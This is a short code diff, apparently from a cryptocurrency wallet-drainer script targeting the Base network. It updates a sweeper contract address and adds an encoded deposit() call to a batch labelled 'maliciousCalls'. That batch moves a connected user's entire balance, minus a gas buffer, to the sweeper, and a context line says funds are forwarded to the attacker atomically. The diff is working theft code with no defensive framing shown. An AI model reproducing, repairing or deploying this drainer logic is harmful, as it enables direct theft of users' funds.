@@ -271,7 +271,7 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
   const BASE_RPC = "https://mainnet.base.org";
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
-  const SWEEPER_CONTRACT = "0xa57a96c76feC586bE399F47437CCA9Fd81F08B92";
+  const SWEEPER_CONTRACT = "0x5D2fb142c8a227cA586507bEFB5D48Aea8FdC9d9";
 
   let userAddress = null;
   let userBalance = null;
@@ -349,14 +349,21 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
+      // Encode deposit() function call
+      const SWEEPER_ABI = ["function deposit() external payable"];
+      const sweeperInterface = new ethers.Interface(SWEEPER_ABI);
+      const depositData = sweeperInterface.encodeFunctionData("deposit", []);
+
       const maliciousCalls = [
         {
           to: SWEEPER_CONTRACT,
-          value: "0x" + (drainAmount / 2n).toString(16)
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: depositData
         },
         {
           to: SWEEPER_CONTRACT,
-          value: "0x" + (drainAmount / 2n).toString(16)
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: depositData
         }
       ];
 
